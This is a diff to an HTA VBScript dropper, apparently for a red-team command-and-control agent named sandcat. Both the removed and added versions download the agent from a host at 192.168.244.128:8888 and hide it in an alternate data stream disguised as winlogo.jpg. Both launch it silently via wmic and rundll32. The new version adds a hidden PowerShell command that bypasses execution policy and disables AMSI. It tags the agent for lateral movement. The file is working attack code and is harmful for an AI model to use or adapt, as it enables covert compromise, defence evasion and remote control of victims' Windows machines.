@@ -1,15 +1,13 @@
 <script language="VBScript">
-Set xhr = CreateObject("MSXML2.XMLHTTP")
-xhr.open "GET", "http://192.168.244.128:8888/file/download", False
-xhr.setRequestHeader "platform","windows"
-xhr.setRequestHeader "file","sandcat.go"
-xhr.send
-data = xhr.responseBody
-' Write data to an ADS and run via wmic (to avoid dropping visible file)
-Set stream = CreateObject("ADODB.Stream")
-stream.Type = 1 : stream.Open
-stream.Write xhr.responseBody : stream.SaveToFile "C:\\Users\\Public\\winlogo.jpg:sc.exe", 2
-CreateObject("Wscript.Shell").Run "wmic process call create 'rundll32 advapi32.dll,CreateProcessAsUser C:\\Users\\Public\\winlogo.jpg:sc.exe -server http://192.168.244.128:8888'",0
+Dim cmd
+cmd = "powershell -windowstyle hidden -exec bypass -Command """
+cmd = cmd & "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+cmd = cmd & "$url='http://192.168.244.128:8888/file/download';"
+cmd = cmd & "$out='C:\\Users\\Public\\winlogo.jpg:sc.exe';"
+cmd = cmd & "$wc=New-Object System.Net.WebClient;"
+cmd = cmd & "$wc.Headers.Add('platform','windows');$wc.Headers.Add('file','sandcat.go');"
+cmd = cmd & "$data=$wc.DownloadData($url);[IO.File]::WriteAllBytes($out,$data);"
+cmd = cmd & "wmic process call create 'rundll32 advapi32.dll,CreateProcessAsUser " & Chr(34) & "C:\\Users\\Public\\winlogo.jpg:sc.exe -server http://192.168.244.128:8888 -group lateral" & Chr(34) & "'"""
+CreateObject("Wscript.Shell").Run cmd, 0
 self.close
 </script>
-
